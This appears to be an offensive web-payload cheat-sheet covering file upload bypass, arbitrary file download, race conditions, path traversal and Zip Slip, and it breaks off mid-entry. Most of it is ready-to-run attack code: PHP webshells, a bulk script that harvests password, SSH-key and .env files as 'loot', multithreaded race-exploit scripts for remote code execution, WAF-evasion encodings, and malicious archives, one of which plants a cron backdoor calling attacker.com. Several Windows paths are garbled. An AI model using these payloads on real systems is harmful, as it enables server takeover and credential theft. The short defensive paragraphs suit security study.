# File Vulnerabilities

_7 web payloads_

### File Upload Bypass  `file-upload-bypass`
_File upload restriction bypass techniques_
Subcategory: **File Upload** · tags: `upload` `bypass` `webshell`

**Prerequisites:**
- The target has a file upload feature
- Upload restrictions exist

**Attack Chain:**

**Extension bypass**
> Extension bypass (including case and double extensions)
```
shell.php.jpg
shell.php%00.jpg
shell.phtml
shell.php5
shell.phar
shell.PhP
```
**Syntax breakdown:**
- `.phtml` — PHP alias extension _value_
- `%00` — truncation character _encoding_
- `.PhP` — case obfuscation _value_

**Content-Type**
> Modify the Content-Type
```
Content-Type: image/jpeg
Content-Type: image/png
```
**Syntax breakdown:**
- `image/jpeg` — allowed MIME type _header_

**Image-embedded shell**
> Image-embedded shell creation
_platform: windows_
```
copy normal.jpg/b + shell.php/a webshell.jpg
```
**Syntax breakdown:**
- `/b` — binary mode _parameter_

**Space bypass**
> Trailing space in the filename
_platform: windows_
```
# Space/null character bypass of suffix detection:
# 1. Add a space at the end of the filename (Windows feature, automatically removed on save):
filename="shell.php "

# 2. %20-encoded space:
Content-Disposition: form-data; name="file"; filename="shell.php%20"

# 3. Null byte truncation (PHP<5.3.4):
filename="shell.php%00.jpg"
filename="shell.php\x00.jpg"

# 4. Tab injection:
filename="shell.php%09.jpg"

# Operation in Burp: intercept the upload request → manually add a space/null byte after .php in the filename
```
**Syntax breakdown:**
- ` ` — Windows feature automatically removes the space _technique_

**Dot bypass**
> Trailing dot in the filename
_platform: windows_
```
# Dot/special character bypass:
# 1. Add a trailing dot (Windows automatically removes trailing dots):
filename="shell.php."
filename="shell.php..."

# 2. Dot + space combination:
filename="shell.php. "
filename="shell.php .jpg"

# 3. Semicolon truncation (IIS 6.0):
filename="shell.asp;.jpg"
filename="test.asp;x.jpg"

# 4. :: concept (not executed, explanation only)
# Windows NTFS stream: shell.php::DATA_STREAM

# 5. Newline injection:
filename="shell.ph
p"

# Test: after uploading, access the URL to confirm whether the file is parsed as PHP
curl "http://target.com/uploads/shell.php." -v
```
**Syntax breakdown:**
- `.` — Windows feature automatically removes the dot _technique_

**NTFS stream**
> NTFS ADS bypass
_platform: windows_
```
# Windows NTFS alternate data stream bypass:
# 1. Standard NTFS ADS bypass:
filename="shell.php::DATA"
# Windows automatically ignores the ::DATA suffix, the file is saved as shell.php

# 2. Other ADS variants:
filename="shell.php::INDEX_ALLOCATION"
filename="shell.php:evil.php"
filename="shell.php:evil.txt:DATA"

# 3. Operation in Burp:
# Intercept the upload request
# Change the filename to: shell.php::DATA
# Send the request

# 4. Verify whether the file was uploaded:
curl "http://target.com/uploads/shell.php" -v
curl "http://target.com/uploads/shell.php::DATA" -v

# Note: only effective in Windows (IIS/NTFS) environments, Linux does not have this feature
```
**Syntax breakdown:**
- `::$DATA` — NTFS data stream identifier _technique_

**Double-write bypass**
> Double-write the extension
```
# Double-write suffix bypass (when the server only removes the sensitive suffix once):
# 1. PHP double-write:
filename="shell.pphphp"    # After removing php, shell.php remains
filename="shell.pHPhp"     # Mixed-case double-write
filename="shell.phphpp"    # Double-write at a different position

# 2. ASP double-write:
filename="shell.asaspp"    # After removing asp, shell.asp remains
filename="shell.aaspsp"

# 3. JSP double-write:
filename="shell.jjspsp"

# 4. Multi-layer nesting:
filename="shell.phpphpphp" # Still .php after two removals

# 5. Combined with case:
filename="shell.PhPhPp"

# Verify: after uploading, confirm the actual filename saved by the server
curl -I "http://target.com/uploads/shell.php"
```
**Syntax breakdown:**
- `pphphp` — php remains after removing php _technique_

**WAF/EDR Bypass Variants:**

**Double extension and NTFS data stream bypass**
> Use double extensions to deceive file type detection, Windows NTFS alternate data streams (::$DATA) to bypass extension checks, and special characters (space, dot, null byte) to truncate the filename
```
# Double extension:
shell.php.jpg
shell.jpg.php
shell.php.test
shell.php%00.jpg

# NTFS alternate data stream (Windows):
shell.php::$DATA
shell.php::$DATA.jpg
shell.asp;.jpg

# Special characters:
shell.php%20
shell.php.
shell.php....
shell.php\x00.jpg
```
**Syntax breakdown:**
- `# Double extension:` — primary command _command_
- `...` — 14 lines total _value_

**Content-Disposition manipulation and chunked upload**
> Bypass WAF stream detection via filename encoding variants of the Content-Disposition header and chunked transfer encoding, and access malicious files inside an archive using PHP wrapper protocols
```
# Content-Disposition field name wrapping bypass:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
Content-Disposition: form-data; name="file"; filename="shell.php"

# Chunked transfer encoding:
Transfer-Encoding: chunked

# PHP Wrapper upload:
zip://uploads/avatar.jpg%23shell
phar://uploads/avatar.jpg/shell.php

# Race condition:
# Access immediately after uploading before the file is deleted
```
**Syntax breakdown:**
- `# Content-Disposition field name wrapping bypass:` — primary command _command_
- `...` — 11 lines total _value_

**Overview:** File upload bypass techniques target the file upload protection mechanisms of web applications. By modifying the file extension, tampering with the MIME type, content type confusion, double extensions, truncation characters, image-embedded shells, and so on, they bypass allowlist/blacklist detection and ultimately upload an executable malicious file (such as a Webshell) to obtain control of the server.

**Vulnerability Principle:** Flaws in file upload validation mechanisms include: relying only on client-side JavaScript validation, only checking the Content-Type header without validating the actual content, an incomplete blacklist (missing variants such as php5/phtml/phar), not renaming and isolating uploaded files, the upload directory having script execution permissions, not detecting file header magic bytes, and parsing vulnerabilities causing non-standard extensions to be executed.

**Exploitation Method:** First test the normal upload flow to confirm the allowed file types, then try in sequence: modify the Content-Type to image/jpeg, use a double extension (test.php.jpg), add null byte truncation (test.php%00.jpg), exploit Windows features (test.php::$DATA), case variants (test.PhP), .htaccess override, image-embedded shell (append PHP code at the end of a legitimate image), and so on; after a successful upload, verify whether the file can be parsed and executed.

**Defensive Measures:** The server should strictly validate the file type (check file header magic bytes rather than the extension); rename uploaded files (use a UUID); prohibit script execution permissions in the upload directory; isolate file storage from the web root; use a separate file service domain; re-render image files to remove embedded code; and limit the upload file size and frequency.

---

### Arbitrary File Download  `file-download`
_Use a path control flaw in a file download feature to download arbitrary sensitive files on the server_
Subcategory: **Download** · tags: `file-download` `lfi` `leak`

**Prerequisites:**
- The target has a file download feature
- The file path parameter is controllable
- The server does not strictly filter the path

**Attack Chain:**

**Identify the file download interface**
> Identify the target's file download interface and parameter names
```
# Common file download URL patterns:
curl -v "http://target.com/download?file=report.pdf"
curl -v "http://target.com/download.php?path=uploads/doc.pdf"
curl -v "http://target.com/api/file/read?name=image.jpg"
curl -v "http://target.com/export?filename=data.csv"
curl -v "http://target.com/attachment/get/123"
```
**Syntax breakdown:**
- `file=report.pdf` — common file parameter names: file, path, name, filename, doc _value_
- `download.php` — typical file download script _value_

**Path traversal to download sensitive files**
> Use path traversal sequences to read sensitive system and application configuration files outside the web root
```
# Linux sensitive files:
curl "http://target.com/download?file=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/shadow"
curl "http://target.com/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "http://target.com/download?file=..%252f..%252f..%252fetc/passwd"

# Windows sensitive files:
curl "http://target.com/download?file=......windowswin.ini"
curl "http://target.com/download?file=......windowssystem32configSAM"

# Web application configuration files:
curl "http://target.com/download?file=../WEB-INF/web.xml"
curl "http://target.com/download?file=../application.properties"
curl "http://target.com/download?file=../.env"
curl "http://target.com/download?file=../config/database.yml"
```
**Syntax breakdown:**
- `../../../` — path traversal sequence, jumps up one level at a time out of the current directory _value_
- `....//....//` — double-write bypass — the server removes ../ but still concatenates ../ _value_
- `%2e%2e/` — URL encoding bypass, %2e is the encoding of . _value_
- `..%252f` — double URL encoding bypass (%25 is the encoding of %) _value_

**Download source code and database configuration**
> Specifically download application source code and database configuration files to obtain database credentials
_platform: linux_
```
# Java application key files:
curl "http://target.com/download?file=../../WEB-INF/web.xml" -o web.xml
curl "http://target.com/download?file=../../WEB-INF/classes/application.yml" -o app.yml
curl "http://target.com/download?file=../../WEB-INF/classes/db.properties" -o db.properties

# PHP application:
curl "http://target.com/download?file=../../config.php" -o config.php
curl "http://target.com/download?file=../../.env" -o .env

# Node.js application:
curl "http://target.com/download?file=../../package.json" -o package.json
curl "http://target.com/download?file=../../.env" -o .env

# Extract database credentials:
grep -iE "password|passwd|pwd|secret|key|db_|database|mysql|postgres" *.yml *.xml *.properties *.env 2>/dev/null
```
**Syntax breakdown:**
- `WEB-INF/web.xml` — Java web application deployment descriptor, contains Servlet configuration _value_
- `application.yml` — Spring Boot main configuration file, often contains the database password _value_
- `.env` — environment variables file, often contains various keys and passwords _value_
- `grep -iE` — case-insensitive extended regex search for sensitive keywords _command_

**Automated bulk sensitive file probing**
> Automatically probe and download multiple common sensitive files
_platform: linux_
```
#!/bin/bash
# Bulk test common sensitive file paths
BASE="http://target.com/download?file="
FILES=(
  "../../../etc/passwd" "../../../etc/shadow" "../../../etc/hosts"
  "../../../proc/self/environ" "../../../proc/self/cmdline"
  "../../WEB-INF/web.xml" "../../WEB-INF/classes/application.properties"
  "../../.env" "../../config.php" "../../web.config"
  "../../../root/.ssh/id_rsa" "../../../root/.bash_history"
  "../../../var/log/apache2/access.log"
)

for f in "${FILES[@]}"; do
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "${BASE}${f}")
  code=$(echo $resp | cut -d: -f1)
  size=$(echo $resp | cut -d: -f2)
  if [ "$code" == "200" ] && [ "$size" -gt 0 ]; then
    echo "[+] FOUND: $f (HTTP $code, $size bytes)"
    curl -s "${BASE}${f}" -o "loot_$(echo $f | tr '/' '_')"
  fi
done
```
**Syntax breakdown:**
- `-w "%{http_code}:%{size_download}"` — curl custom output format to obtain the status code and size _command_
- `/proc/self/environ` — Linux process environment variables file, may contain passwords _value_
- `/root/.ssh/id_rsa` — SSH private key file, can directly log into the server _value_

**WAF/EDR Bypass Variants:**

**Double URL encoding bypass**
> Bypass WAF detection of path traversal characters via double URL encoding, Unicode overlong encoding, and so on
```
# Double-encoded ../
?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
?file=%252e%252e%255cetc%255cpasswd

# Unicode encoding variants
?file=..%c0%af..%c0%afetc/passwd
?file=..%ef%bc%8f..%ef%bc%8fetc/passwd

# Mixed encoding
?file=..%2f..%2f..%2fetc%2fpasswd
?file=....//....//etc/passwd
```
**Syntax breakdown:**
- `# Double-encoded ../` — primary command _command_
- `...` — 9 lines total _value_

**Parameter name substitution and path manipulation**
> Try different file parameter names and URL protocol wrappers to bypass WAF rules
```
# Common file download parameter name fuzzing
?path=../../etc/passwd
?filepath=../../etc/passwd
?filename=../../etc/passwd
?doc=../../etc/passwd
?download=../../etc/passwd
?src=../../etc/passwd
?url=file:///etc/passwd

# Use a URL protocol
?file=file:///etc/passwd
?file=php://filter/convert.base64-encode/resource=config.php
```
**Syntax breakdown:**
- `# Common file download parameter name fuzzing` — primary command _command_
- `...` — 11 lines total _value_

**Null byte truncation and suffix bypass**
> Bypass file path checks via null byte truncation, path length limits, and special character confusion
```
# Null byte truncation (PHP < 5.3.4)
?file=../../etc/passwd%00
?file=../../etc/passwd%00.jpg

# Path truncation (Windows long path)
?file=../../etc/passwd..............................................................

# Dot-slash confusion
?file=....//....//....//etc/passwd
?file=..;/..;/..;/etc/passwd
?file=..\..\..\etc\passwd
```
**Syntax breakdown:**
- `# Null byte truncation (PHP < 5.3.4)` — primary command _command_
- `...` — 9 lines total _value_

**Overview:** The Arbitrary File Download (Arbitrary File Download/Path Traversal) vulnerability is a common high-risk vulnerability in web applications. When the file path parameter of a file download feature can be controlled by the user and the server does not strictly filter it, an attacker can read arbitrary files on the server via path traversal (../), including sensitive information such as configuration files, source code, database credentials, and SSH private keys.

**Vulnerability Principle:** The file download interface directly concatenates the user-input filename/path into the filesystem path without path normalization, allowlist filtering, or sandbox restriction, allowing an attacker to use the ../ sequence to jump out of the intended download directory.

**Exploitation Method:** Exploitation flow: 1) identify the file download interface and parameters 2) test basic path traversal (../) 3) try encoding bypass (URL encoding/double encoding/Unicode) 4) download system sensitive files to verify the vulnerability 5) specifically download application configuration files to obtain database credentials 6) bulk-probe and download sensitive files.

**Defensive Measures:** 1) use a file ID rather than the filename as the parameter 2) restrict downloadable files with an allowlist 3) validate that the path is within the allowed directory after normalization 4) use chroot or a sandbox to restrict the file access scope 5) remove path traversal sequences such as ../ 6) prohibit downloading files in sensitive directories.

---

### Race Condition  `file-competition`
_Exploit a race condition during file upload/processing to perform malicious operations within the time window between the security check and file use_
Subcategory: **Race Condition** · tags: `race-condition` `file-upload`

**Prerequisites:**
- The target has a file upload feature
- The server uses an upload-then-check processing flow
- The uploaded file can be accessed with high concurrency
- The temporary file storage path is known

**Attack Chain:**

**Identify the race condition window**
> Analyze the file upload processing flow to identify the time window before and after the security check
_platform: linux_
```
# Analyze the upload flow:
# 1. The file is uploaded to a temporary directory
# 2. The backend performs a security check (file type/content)
# 3. If the check passes it is kept, otherwise it is deleted
# There is a time window between step 1 and step 3

# Test the upload response time (to determine whether there is a check delay)
for i in $(seq 1 5); do
  time curl -s -o /dev/null -w "%{http_code}" -F "file=@test.jpg" "http://target.com/upload"
done
```
**Syntax breakdown:**
- `time curl` — time the response time of the upload request _command_
- `-F "file=@test.jpg"` — upload the file in multipart/form-data format _parameter_

**Race condition exploitation - concurrent upload and access**
> Access and execute the malicious file within the time window after upload before the security check deletes it
_platform: linux_
```
# Malicious PHP file (shell.php):
# <?php system($_GET["cmd"]); ?>

# Method 1: use two terminals for concurrent operations
# Terminal 1 - continuous upload:
while true; do
  curl -s -F "file=@shell.php" "http://target.com/upload" &
done

# Terminal 2 - continuous access:
while true; do
  result=$(curl -s "http://target.com/uploads/shell.php?cmd=id")
  if echo "$result" | grep -q "uid="; then
    echo "[+] RCE SUCCESS: $result"
    break
  fi
done
```
**Syntax breakdown:**
- `while true; do ... done` — infinite loop to keep trying _command_
- `&` — execute in the background without waiting for the previous upload to complete _operator_
- `grep -q "uid="` — silently check whether the id command was executed successfully _command_

**Python concurrent race exploitation script**
> Multi-threaded concurrent upload and access to improve the success rate of race condition exploitation
```
import requests
import threading
import time

TARGET = "http://target.com"
UPLOAD_URL = f"{TARGET}/upload"
SHELL_URL = f"{TARGET}/uploads/shell.php?cmd=id"

def upload_loop():
    files = {"file": ("shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")}
    while not stop_event.is_set():
        try:
            requests.post(UPLOAD_URL, files=files, timeout=2)
        except: pass

def access_loop():
    while not stop_event.is_set():
        try:
            r = requests.get(SHELL_URL, timeout=1)
            if "uid=" in r.text:
                print(f"[+] RCE! Response: {r.text[:200]}")
                stop_event.set()
                return
        except: pass

stop_event = threading.Event()
threads = []
for _ in range(10):
    threads.append(threading.Thread(target=upload_loop))
for _ in range(20):
    threads.append(threading.Thread(target=access_loop))
for t in threads: t.start()
time.sleep(60)
stop_event.set()
for t in threads: t.join()
```
**Syntax breakdown:**
- `threading.Thread` — create a concurrent thread _command_
- `stop_event` — inter-thread synchronization signal, stops all threads after success _variable_
- `"image/jpeg"` — forge the MIME type to bypass the frontend check _value_

**.htaccess race write**
> Use a race upload of .htaccess to make Apache parse and execute image files as PHP
_platform: linux_
```
# If .htaccess can be uploaded (even if it will be deleted):
# .htaccess content:
AddType application/x-httpd-php .jpg

# Race exploitation:
# 1. First normally upload a .jpg file containing PHP code
curl -F "file=@shell.jpg" "http://target.com/upload"

# 2. Access the .jpg within the time window while .htaccess exists
while true; do
  curl -s -F "file=@.htaccess" "http://target.com/upload" &
  result=$(curl -s "http://target.com/uploads/shell.jpg?cmd=id")
  [ -n "$result" ] && echo "[+] $result" && break
done
```
**Syntax breakdown:**
- `AddType application/x-httpd-php .jpg` — make Apache execute .jpg files as PHP _value_
- `.htaccess` — Apache directory-level configuration file _value_

**WAF/EDR Bypass Variants:**

**Concurrent upload race exploitation**
> Access the uploaded file within the time window between the file check and deletion via a large number of concurrent requests
```
# Python concurrent race upload
import threading, requests

def upload_shell():
    files = {'file': ('test.php', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

def access_shell():
    r = requests.get('http://target/uploads/test.php')
    if 'security_check' in r.text:
        print('[+] Race won!')

for i in range(100):
    t1 = threading.Thread(target=upload_shell)
    t2 = threading.Thread(target=access_shell)
    t1.start(); t2.start()
```
**Syntax breakdown:**
- `# Python concurrent race upload` — primary command _command_
- `...` — 13 lines total _value_

**.htaccess race override**
> Use a race condition to write .htaccess in the check gap so image files are parsed as PHP
```
# Race condition upload of .htaccess
import threading, requests

def upload_htaccess():
    files = {'file': ('.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain')}
    requests.post('http://target/upload', files=files)

def upload_payload():
    files = {'file': ('test.jpg', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

for i in range(50):
    t1 = threading.Thread(target=upload_htaccess)
    t2 = threading.Thread(target=upload_payload)
    t1.start(); t2.start()
```
**Syntax breakdown:**
- `# Race condition upload of .htaccess` — primary command _command_
- `...` — 12 lines total _value_

**Chunked upload time window**
> Extend the server processing time via chunked transfer encoding to enlarge the race exploitation window
```
# Use chunked transfer to extend the upload time window
import socket, time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target', 80))

headers = (
    "POST /upload HTTP/1.1\r\n"
    "Host: target\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Type: multipart/form-data; boundary=abc\r\n\r\n"
)
sock.send(headers.encode())

# Slowly send chunked data to extend the file existence time
chunks = ["5\r\nhello\r\n", "5\r\nworld\r\n", "0\r\n\r\n"]
for chunk in chunks:
    sock.send(chunk.encode())
    time.sleep(0.5)
```
**Syntax breakdown:**
- `SLEEP()` — time delay _function_
- `Content-Type` — content type header _header_
- `Transfer-Encoding` — transfer encoding header _header_
- `chunked` — chunked transfer _keyword_

**Overview:** A Race Condition vulnerability occurs in the time window after a file is uploaded before the security check (deletion). The server usually first saves the file to a temporary directory, then performs a security check (such as file type, content scanning), and deletes it if the check fails. There is a millisecond-level time window between saving and deletion, and an attacker can access the malicious file within that window via high concurrency to achieve RCE.

**Vulnerability Principle:** The server uses a "save then check" file processing flow, and the temporary file is stored in a web-accessible directory, so an attacker can directly access the file via URL before the security check completes.

**Exploitation Method:** Exploitation flow: 1) analyze the upload flow and response time 2) determine the temporary file storage path 3) prepare a malicious file (webshell) 4) multi-threaded concurrent upload + access 5) successfully execute the malicious code within the time window.

**Defensive Measures:** 1) store the temporary file in a web-inaccessible directory 2) use a random filename 3) check before saving (save to a non-web directory, and only move it after the check passes) 4) restrict the execution permissions of the upload directory 5) use a file lock to ensure atomic operations.

---

### Path Traversal  `file-traversal`
_Use path traversal (../) sequences to break through the directory restrictions of file access, reading or writing arbitrary files outside the web root_
Subcategory: **Traversal** · tags: `traversal` `file`

**Prerequisites:**
- The target has a file read/inclusion feature
- The file path parameter is controllable
- The server's path filtering is not strict

**Attack Chain:**

**Basic path traversal test**
> Test basic path traversal and the required directory jump depth
_platform: linux_
```
# Basic traversal:
curl "http://target.com/file?path=../../../../etc/passwd"
curl "http://target.com/image?name=../../../../etc/passwd"

# Test the traversal depth (usually 3-10 levels are enough to reach the root):
for i in $(seq 1 10); do
  traversal=$(printf "../%.0s" $(seq 1 $i))
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "http://target.com/file?path=${traversal}etc/passwd")
  echo "Depth $i: $resp"
done
```
**Syntax breakdown:**
- `../../../../` — jump up 4 directory levels _value_
- `printf "../%.0s"` — generate a specified number of ../ sequences _command_

**Encoding to bypass path filtering**
> Use multiple encoding methods to bypass the path traversal filtering mechanism
```
# URL encoding:
curl "http://target.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"

# Double URL encoding:
curl "http://target.com/file?path=%252e%252e%252f%252e%252e%252fetc/passwd"

# Unicode encoding:
curl "http://target.com/file?path=..%c0%afetc/passwd"
curl "http://target.com/file?path=..%ef%bc%8fetc/passwd"

# Null byte truncation (PHP<5.3.4):
curl "http://target.com/file?path=../../../../etc/passwd%00.jpg"

# Double-write bypass (server removes ../ once):
curl "http://target.com/file?path=....//....//....//etc/passwd"

# Backslash (Windows):
curl "http://target.com/file?path=......windowswin.ini"

# Mixed slashes:
curl "http://target.com/file?path=../../../../etc/passwd"
```
**Syntax breakdown:**
- `%2e%2e%2f` — the URL-encoded form of ../ _value_
- `%252e%252e%252f` — the double-URL-encoded ../ (%25 is the encoding of %) _value_
- `%c0%af` — the Unicode overlong encoding form of / (UTF-8) _value_
- `%00` — null byte truncation of the trailing file extension restriction _value_
- `....//` — double-write ../ — after the server removes ../ once, the remainder is still ../ _value_

**Windows-specific path traversal**
> Path traversal techniques and sensitive files specific to the Windows environment
_platform: windows_
```
# UNC path (may trigger SMB authentication):
curl "http://target.com/file?path=\attacker.comshare	est"

# Windows sensitive files:
curl "http://target.com/file?path=C:Windowswin.ini"
curl "http://target.com/file?path=C:WindowsSystem32configSAM"
curl "http://target.com/file?path=C:inetpubwwwrootweb.config"
curl "http://target.com/file?path=C:UsersAdministrator.sshid_rsa"

# IIS short filename enumeration:
curl -v "http://target.com/file?path=C:inetpubwwwrootWEB~1.CON"
```
**Syntax breakdown:**
- `\attacker.com\share` — a UNC path can trigger an SMB connection leaking the NTLM hash _value_
- `web.config` — IIS configuration file, may contain the database connection string _value_
- `WEB~1.CON` — 8.3 short filename format used to enumerate files _value_

**LFI to RCE upgrade**
> Upgrade file inclusion (LFI) to remote code execution (RCE)
_platform: linux_
```
# 1. Log file inclusion (Log Poisoning):
curl "http://target.com/" -A "<?php system($_GET['cmd']); ?>"
curl "http://target.com/file?path=../../../var/log/apache2/access.log&cmd=id"

# 2. /proc/self/environ inclusion:
curl "http://target.com/file?path=../../../proc/self/environ" -A "<?php system($_GET['c']); ?>"

# 3. PHP Session file inclusion:
# First write the payload into the session (such as the username field)
# Then include the session file:
curl "http://target.com/file?path=../../../tmp/sess_SESSION_ID"

# 4. PHP Filter to read source code:
curl "http://target.com/file?path=php://filter/convert.base64-encode/resource=config.php"
```
**Syntax breakdown:**
- `-A "<?php system() ?>"` — User-Agent injection of PHP code written to access.log _command_
- `/proc/self/environ` — process environment variables containing HTTP request header information _value_
- `php://filter/convert.base64-encode` — PHP stream wrapper that Base64-encodes and outputs the file content _value_

**WAF/EDR Bypass Variants:**

**Encoding to bypass path filtering**
> Bypass the WAF's path detection rules via double URL encoding, Unicode overlong encoding, and non-standard UTF-8 encoding
```
# Double URL encoding
..%252f..%252f..%252fetc%252fpasswd

# Unicode/UTF-8 overlong encoding
..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd

# 16-bit Unicode encoding
..%u002f..%u002fetc/passwd
..%u2215..%u2215etc/passwd

# URL encoding mix
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5cetc%5cpasswd
```
**Syntax breakdown:**
- `# Double URL encoding` — primary command _command_
- `...` — 11 lines total _value_

**Exploiting path normalization differences**
> Bypass security restrictions by exploiting differences in path parsing across middleware (IIS/Apache/Nginx/Tomcat)
```
# Backslash substitution (IIS/Windows)
..\..\..\etc\passwd
..\\..\\..\\windows\\win.ini

# Dot-slash variants
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/etc/passwd

# Java/Tomcat special handling
/..;/..;/..;/etc/passwd
/.;/../.;/../etc/passwd

# Nginx path folding
/static/../../../etc/passwd
/images/..%2f..%2f..%2fetc/passwd
```
**Syntax breakdown:**
- `# Backslash substitution (IIS/Windows)` — primary command _command_
- `...` — 13 lines total _value_

**Null byte and path truncation bypass**
> Bypass via null byte injection, filesystem path length limits, and Windows special filename handling mechanisms
```
# Null byte truncation
../../etc/passwd%00.png
../../etc/passwd\x00.jpg

# Windows short filename
..\..\..\WINDOW~1\system32\drivers\etc\hosts

# Overlong path truncation (PHP < 5.3)
../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
# Dot-space-dot truncation (Windows)
../../windows/win.ini. . .
```
**Syntax breakdown:**
- `# Null byte truncation` — primary command _command_
- `...` — 9 lines total _value_

**Overview:** Path Traversal (Path Traversal/Directory Traversal) is the most common filesystem-type vulnerability in web applications. By injecting the ../ sequence or its encoding variants into the file path parameter, an attacker jumps out of the file directory preset by the application and reads (LFI) or even writes arbitrary files on the server. Combined with techniques such as log injection, LFI can be upgraded to RCE.

**Vulnerability Principle:** When the application handles the file path, it directly concatenates the user input into the filesystem path without path canonicalization and directory restriction validation.

**Exploitation Method:** Exploitation flow: 1) identify the file operation interface 2) test basic ../ traversal 3) try encoding bypass (URL encoding/double encoding/Unicode) 4) read sensitive system files 5) try LFI→RCE upgrade (log poisoning/session inclusion/PHP Filter).

**Defensive Measures:** 1) use a file ID mapping instead of a direct path 2) validate that the path is within an allowlisted directory after normalization 3) chroot to restrict the file access scope 4) disable the ../ sequence and its various encoding forms 5) run the application process with least privilege.

---

### Zip Slip  `file-zip-slip`
_Use a path traversal in a maliciously crafted archive file (ZIP/TAR) to achieve arbitrary file writing, overwriting critical files on the server or writing a Webshell_
Subcategory: **Zip** · tags: `zip-slip` `file` `rce`

**Prerequisites:**
- The target has a ZIP/TAR file upload and auto-extraction feature
- The extraction library does not filter path traversal in filenames
- The path to the web root or another critical directory is known

**Attack Chain:**

**Probe the ZIP upload and extraction feature**
> Identify the target's ZIP upload/extraction feature and file storage path
_platform: linux_
```
# Common ZIP upload/extraction scenarios:
# - Bulk file upload (template/resource import)
# - Plugin/theme installation (WordPress/Discuz)
# - Backup restore feature
# - Document processing (DOCX/XLSX are essentially ZIP)

# Test a normal ZIP upload:
echo "test" > test.txt
zip test.zip test.txt
curl -F "file=@test.zip" "http://target.com/upload/batch"

# Confirm the storage path of the extracted file:
curl "http://target.com/uploads/test.txt"
```
**Syntax breakdown:**
- `zip test.zip test.txt` — create a normal ZIP archive _command_

**Construct a Zip Slip malicious archive**
> Use Python to create a malicious ZIP archive containing path traversal filenames
```
# Python script to create a malicious ZIP:
import zipfile
import os

# Goal: write a webshell to the web root
with zipfile.ZipFile("evil.zip", "w") as zf:
    # Normal file (disguise)
    zf.writestr("readme.txt", "Normal file")
    # Malicious file (path traversal)
    zf.writestr("../../../var/www/html/test_shell.php",
                "<?php echo system($_GET['cmd']); ?>")
    # Or overwrite a configuration file:
    zf.writestr("../../../../../../etc/cron.d/backdoor",
                "* * * * * root curl http://attacker.com/callback")

print("[+] evil.zip created")
print("Files in ZIP:")
with zipfile.ZipFile("evil.zip", "r") as zf:
    for info in zf.infolist():
        print(f"  {info.filename} ({info.file_size} bytes)")
```
**Syntax breakdown:**
- `zipfile.ZipFile` — the Python standard library ZIP operation module _command_
- `../../../var/www/html/` — path traversal in the filename, jumps out of the target directory when extracting _value_
- `zf.writestr()` — directly write string content into the ZIP with a specified filename _command_

**Upload and verify Zip Slip**
> Upload the malicious ZIP and verify whether the Webshell was successfully written
_platform: linux_
```
# Upload the malicious ZIP
curl -F "file=@evil.zip" "http://target.com/upload/batch"

# Verify the webshell was written successfully
curl "http://target.com/test_shell.php?cmd=id"
curl "http://target.com/test_shell.php?cmd=whoami"

# If the target is a Java application (WAR package):
# Construct a malicious WAR/JAR package (also essentially a ZIP):
jar cf evil.war -C webshell/ .
# Or change the filename to ../../../webapps/ROOT/shell.jsp
```
**Syntax breakdown:**
- `curl -F "file=@evil.zip"` — upload the crafted malicious ZIP file _command_
- `test_shell.php?cmd=id` — verify whether the written Webshell is executable _value_

**TAR package Zip Slip variant**
> Use a TAR package for Zip Slip, including the symbolic link attack variant
```
# Construct a malicious TAR package:
import tarfile
import io

with tarfile.open("evil.tar.gz", "w:gz") as tar:
    # Add the malicious file
    content = b"<?php system($_GET['cmd']); ?>"
    info = tarfile.TarInfo(name="../../../var/www/html/test_t.php")
    info.size = len(content)
    tar.addfile(info, io.BytesIO(content))

# Use a symbolic link attack:
import tarfile
with tarfile.open("evil_symlink.tar.gz", "w:gz") as tar:
    # Create a symbolic link pointing to /etc/passwd
    info = tarfile.TarInfo(name="link_to_passwd")
    info.type = tarfile.SYMTYPE
    info.linkname = "/etc/passwd"
    tar.addfile(info)
    # Then overwrite the target file via "link_to_passwd"
    content = b"root:x:0:0:root:/root:/bin/bash"
    info2 = tarfile.TarInfo(name="link_to_passwd")
    info2.size = len(content)
    tar.addfile(info2, io.BytesIO(content))
```
**Syntax breakdown:**
- `tarfile.open("w:gz")` — create a gzip-compressed TAR package _command_
- `tarfile.SYMTYPE` — create a symbolic link entry in the TAR _value_
- `info.linkname` — the target path the symbolic link points to _value_

**WAF/EDR Bypass Variants:**

**Alternative archive format bypass**
> Use alternative archive formats such as tar/7z/cpio; the WAF may only detect path traversal in the zip format
```
# Use the tar format (may not be detected)
import tarfile, io
with tarfile.open('test.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='../../../tmp/test.txt')
    info.size = 14
    tar.addfile(info, io.BytesIO(b'security_check'))

# Use the 7z format
7z a test.7z ../../../tmp/test.txt

# Use the cpio format
echo "../../../tmp/test.txt" | cpio -o > test.cpio
```
**Syntax breakdown:**
- `# Use the tar format (may not be detected)` — primary command _command_
- `...` — 10 lines total _value_

**Symbolic link attack**
> Embed a symbolic link pointing to a sensitive file in the archive, and read the target file via the symbolic link after extraction
```
# Create an archive containing a symbolic link
import zipfile, os

# Method 1: tar symbolic link
import tarfile
with tarfile.open('symlink.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='link')
    info.type = tarfile.SYMTYPE
    info.linkname = '/etc/passwd'
    tar.addfile(info)

# Method 2: embed a symbolic link in a zip (Linux)
os.symlink('/etc/passwd', '/tmp/link')
with zipfile.ZipFile('symlink.zip', 'w') as zf:
    zf.write('/tmp/link', 'link')
```
**Syntax breakdown:**
